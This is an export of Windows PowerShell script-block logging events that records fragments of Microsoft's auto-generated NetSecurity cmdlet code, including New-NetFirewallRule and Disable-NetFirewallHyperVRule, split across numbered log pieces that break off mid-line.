          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Direction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Direction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Action')) {
          [object]$__cmdletization_value = ${Action}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EdgeTraversalPolicy')) {
          [object]$__cmdletization_value = ${EdgeTraversalPolicy}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EdgeTraversalPolicy'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.EdgeTraversal'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EdgeTraversalPolicy'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.EdgeTraversal'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('LooseSourceMapping')) {
          [object]$__cmdletization_value = ${LooseSourceMapping}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LooseSourceMapping'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LooseSourceMapping'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('LocalOnlyMapping')) {
          [object]$__cmdletization_value = ${LocalOnlyMapping}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalOnlyMapping'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalOnlyMapping'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Owner')) {
          [object]$__cmdletization_value = ${Owner}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Owner'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Owner'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('LocalAddress')) {
          [object]$__cmdletization_value = ${LocalAddress}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemoteAddress')) {
          [object]$__cmdletization_value = ${RemoteAddress}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Protocol')) {
          [object]$__cmdletization_value = ${Protocol}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Protocol'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Protocol'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('LocalPort')) {
          [object]$__cmdletization_value = ${LocalPort}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalPort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalPort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemotePort')) {
          [object]$__cmdletization_value = ${RemotePort}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemotePort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemotePort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('IcmpType')) {
          [object]$__cmdletization_value = ${IcmpType}
          $__cmdletization_methodPa

ScriptBlock ID: a9566490-7339-4e56-b9a5-98febda235bb
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 19):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetFirewallRule'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function New-NetFirewallRule
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('ID')]
    [string]
    ${Name},

    [Parameter(ParameterSetName='cim:CreateInstance0', Mandatory=$true)]
    [string]
    ${DisplayName},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Description},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Group},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled]
    ${Enabled},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile]
    ${Profile},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${Platform},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction]
    ${Direction},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action]
    ${Action},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.EdgeTraversal]
    ${EdgeTraversalPolicy},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('LSM')]
    [bool]
    ${LooseSourceMapping},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [bool]
    ${LocalOnlyMapping},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Owner},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${LocalAddress},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${RemoteAddress},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Protocol},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${LocalPort},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${RemotePort},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${IcmpType},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('DynamicTransport')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DynamicTransport]
    ${DynamicTarget},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Program},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Package},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Service},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [WildcardPattern[]]
    ${InterfaceAlias},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.InterfaceType]
    ${InterfaceType},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${LocalUser},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${RemoteUser},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${RemoteMachine},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Authentication]
    ${Authentication},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Encryption]
    ${Encryption},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [bool]
    ${OverrideBlockRules},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${RemoteDynamicKeywordAddresses},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${PolicyAppId},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${PackageFamilyName},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PolicyStore')) {
          [object]$__cmdletization_value = ${PolicyStore}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('GPOSession')) {
          [object]$__cmdletization_value = ${GPOSession}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Name')) {
          [object]$__cmdletization_value = ${Name}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InstanceID'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InstanceID'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisplayName')) {
          [object]$__cmdletization_value = ${DisplayName}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Description')) {
          [object]$__cmdletization_value = ${Description}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Group')) {
          [object]$__cmdletization_value = ${Group}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RuleGroup'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RuleGroup'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.Contai

ScriptBlock ID: a9566490-7339-4e56-b9a5-98febda235bb
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (5 of 5):
.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Enable', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallHyperVRule.cmdletDefinitIon.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Enable-NetFirewallHyperVRule' -Alias '*'
        

function Disable-NetFirewallHyperVRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallHyperVRule')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint16[]]
    ${RulePriority},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction[]]
    ${Direction},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${VMCreatorId},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Protocol},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action[]]
    ${Action},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.HyperVRuleStatus[]]
    ${EnforcementStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetFirewallHyperVRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RulePriority') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RulePriority})
        $__cmdletization_queryBuilder.FilterByProperty('RulePriority', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Direction') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Direction})
        $__cmdletization_queryBuilder.FilterByProperty('Direction', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('VMCreatorId') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${VMCreatorId})
        $__cmdletization_queryBuilder.FilterByProperty('VMCreatorId', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Protocol') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Protocol})
        $__cmdletization_queryBuilder.FilterByProperty('Protocol', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Action') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Action})
        $__cmdletization_queryBuilder.FilterByProperty('Action', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('EnforcementStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${EnforcementStatus})
        $__cmdletization_queryBuilder.FilterByProperty('EnforcementStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
